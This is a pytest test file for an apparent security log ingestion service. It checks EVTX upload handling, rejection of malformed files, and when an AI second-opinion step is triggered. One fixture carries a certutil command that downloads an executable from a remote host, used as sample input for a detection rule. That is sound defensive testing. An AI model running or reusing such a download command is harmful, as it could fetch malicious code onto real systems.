"""Day 6 verification (Pair 1): POST /ingest accepts EVTX uploads, runs
the read -> normalize -> persist pipeline, and handles malformed/empty/
wrong-format files. `api_client` fixture (conftest.py) provides the
TestClient + in-memory SQLite session.
"""

from pathlib import Path

from app.models.event import Event

SYSMON_DEMO_PATH = Path(__file__).resolve().parents[2] / "sample_logs" / "sysmon_demo.evtx"


def _system(
    event_id,
    computer="WORKSTATION01",
    system_time="2026-05-24T15:25:16.809914+00:00",
    channel="Microsoft-Windows-Sysmon/Operational",
):
    return {
        "EventID": event_id,
        "TimeCreated": {"@SystemTime": system_time},
        "Computer": computer,
        "Channel": channel,
    }


def _record(event_id, computer="WORKSTATION01", channel="Microsoft-Windows-Sysmon/Operational"):
    return {"Event": {"System": _system(event_id, computer=computer, channel=channel), "EventData": {"Data": []}}}


def test_ingest_sysmon_demo_happy_path(api_client):
    client, SessionLocal = api_client
    with open(SYSMON_DEMO_PATH, "rb") as f:
        response = client.post(
            "/ingest",
            files={"file": ("sysmon_demo.evtx", f, "application/octet-stream")},
        )
    assert response.status_code == 200
    assert response.json() == {
        "filename": "sysmon_demo.evtx",
        "records_read": 4,
        "events_ingested": 4,
        "events_skipped": 0,
        "rule_matches": 0,
        "matched_rule_titles": [],
        "alerts_created": 0,
        "incident_ids": [],
        "covered_events": 4,
        "uncovered_events": 0,
        "uncovered_breakdown": [],
        "ai_opinion_id": None,
    }
    with SessionLocal() as db:
        assert db.query(Event).count() == 4


def test_ingest_rejects_wrong_extension(api_client):
    client, SessionLocal = api_client
    response = client.post(
        "/ingest",
        files={"file": ("notlogs.txt", b"just some text", "text/plain")},
    )
    assert response.status_code == 400
    assert "unsupported file type" in response.json()["detail"]
    with SessionLocal() as db:
        assert db.query(Event).count() == 0


def test_ingest_rejects_empty_file(api_client):
    client, _ = api_client
    response = client.post(
        "/ingest",
        files={"file": ("empty.evtx", b"", "application/octet-stream")},
    )
    assert response.status_code == 400
    assert response.json()["detail"] == "uploaded file is empty"


def test_ingest_rejects_oversized_file(api_client, monkeypatch):
    # Monkeypatch the limit down rather than actually sending 100MB+ --
    # same effect, instant instead of slow.
    monkeypatch.setattr("app.api.routes_ingest.MAX_UPLOAD_BYTES", 10)
    client, _ = api_client
    response = client.post(
        "/ingest",
        files={"file": ("big.evtx", b"x" * 100, "application/octet-stream")},
    )
    assert response.status_code == 413
    assert "too large" in response.json()["detail"]


def test_ingest_rejects_corrupted_evtx_bytes(api_client):
    client, _ = api_client
    # Under ~40 bytes, python-evtx fails to even read the file header and
    # raises EvtxReadError; larger garbage blobs used to be read as a
    # zero-chunk/zero-record "success" instead of raising, since python-evtx
    # never validates the magic bytes on its own (see evtx_reader.py, which
    # now checks FileHeader.check_magic() explicitly to close that gap).
    garbage = b"not a real evtx file, too short"
    response = client.post(
        "/ingest",
        files={"file": ("corrupt.evtx", garbage, "application/octet-stream")},
    )
    assert response.status_code == 400
    assert response.json()["detail"].startswith("failed to parse EVTX file")

    # Realistic-size garbage (e.g. a renamed .txt file, like fake.evtx in the
    # Postman collection) is long enough that python-evtx's chunk-bounds
    # arithmetic alone never raises -- this is the case that previously
    # slipped through as a false 200.
    larger_garbage = b"This is intentionally corrupted EVTX test data. " * 3
    response = client.post(
        "/ingest",
        files={"file": ("fake.evtx", larger_garbage, "application/octet-stream")},
    )
    assert response.status_code == 400
    assert response.json()["detail"].startswith("failed to parse EVTX file")


def test_ingest_skips_malformed_records_and_ingests_the_rest(api_client, monkeypatch):
    client, SessionLocal = api_client
    good_1 = _record("1")
    good_2 = _record("11")
    bad = _record("1")
    del bad["Event"]["System"]["EventID"]  # triggers EventNormalizationError

    monkeypatch.setattr(
        "app.api.routes_ingest.read_records_as_dicts",
        lambda path: iter([good_1, bad, good_2]),
    )

    response = client.post(
        "/ingest",
        files={"file": ("fake.evtx", b"content is irrelevant, reader is mocked", "application/octet-stream")},
    )
    assert response.status_code == 200
    assert response.json() == {
        "filename": "fake.evtx",
        "records_read": 3,
        "events_ingested": 2,
        "events_skipped": 1,
        "rule_matches": 0,
        "matched_rule_titles": [],
        "alerts_created": 0,
        "incident_ids": [],
        "covered_events": 2,
        "uncovered_events": 0,
        "uncovered_breakdown": [],
        "ai_opinion_id": None,
    }
    with SessionLocal() as db:
        assert db.query(Event).count() == 2


# -- AI second opinion trigger (uncovered events, zero rule matches) -------


def test_ingest_triggers_ai_opinion_for_fully_uncovered_zero_match_file(api_client, monkeypatch):
    """event_id 9999 isn't in any category's event-id set on any channel --
    guaranteed uncovered regardless of which rules are loaded."""
    client, SessionLocal = api_client
    monkeypatch.setattr(
        "app.api.routes_ingest.read_records_as_dicts",
        lambda path: iter([_record("9999", channel="Application")]),
    )
    # fill_in_opinion (run as a BackgroundTask) opens its own fresh
    # SessionLocal() -- outside FastAPI's get_db dependency-override
    # mechanism the api_client fixture uses, so it must be pointed at the
    # same in-memory test engine explicitly.
    monkeypatch.setattr("app.services.ai_opinion_service.SessionLocal", SessionLocal)
    monkeypatch.setattr("app.services.ai_opinion_service.retrieve", lambda query, k: [])
    monkeypatch.setattr(
        "app.services.ai_opinion_service.generate",
        lambda messages: "Nothing stands out here.\n\n## Assessment: Nothing unusual noted",
    )

    response = client.post(
        "/ingest",
        files={"file": ("mystery.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
    )

    assert response.status_code == 200
    body = response.json()
    assert body["rule_matches"] == 0
    assert body["uncovered_events"] == 1
    assert body["ai_opinion_id"] is not None

    opinion_response = client.get(f"/ai-opinions/{body['ai_opinion_id']}")
    assert opinion_response.status_code == 200
    opinion = opinion_response.json()
    # TestClient runs BackgroundTasks inline before returning control, so by
    # the time the POST above returns, the (mocked) LLM call has already
    # resolved -- this asserts the *shape* of that terminal state, not
    # timing (see ai_opinion_service tests for the fire-and-forget contract
    # in isolation).
    assert opinion["status"] == "ready"
    assert opinion["assessment_label"] == "nothing_unusual"
    with SessionLocal() as db:
        assert db.query(Event).count() == 1


def test_ingest_does_not_trigger_ai_opinion_when_a_rule_matches(api_client, monkeypatch):
    monkeypatch.setattr(
        "app.api.routes_ingest.read_records_as_dicts",
        lambda path: iter(
            [
                {
                    "Event": {
                        "System": _system("1", channel="Microsoft-Windows-Sysmon/Operational"),
                        "EventData": {
                            "Data": [
                                {"@Name": "Image", "#text": "certutil.exe"},
                                {"@Name": "CommandLine", "#text": "certutil.exe -urlcache -split -f http://x/a.exe"},
                            ]
                        },
                    }
                }
            ]
        ),
    )
    called = {"opinion": False}
    monkeypatch.setattr(
        "app.api.routes_ingest.create_pending_opinion",
        lambda *a, **k: called.__setitem__("opinion", True) or None,
    )

    client, _SessionLocal = api_client
    response = client.post(
        "/ingest",
        files={"file": ("real_hit.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
    )

    assert response.status_code == 200
    assert response.json()["rule_matches"] >= 1
    assert response.json()["ai_opinion_id"] is None
    assert called["opinion"] is False


def test_ingest_does_not_trigger_ai_opinion_when_fully_covered_and_clean(api_client, monkeypatch):
    monkeypatch.setattr(
        "app.api.routes_ingest.read_records_as_dicts",
        lambda path: iter([_record("1"), _record("11")]),  # both covered Sysmon categories, no rule matches
    )

    client, _SessionLocal = api_client
    response = client.post(
        "/ingest",
        files={"file": ("clean.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
    )

    assert response.status_code == 200
    body = response.json()
    assert body["rule_matches"] == 0
    assert body["uncovered_events"] == 0
    assert body["ai_opinion_id"] is None
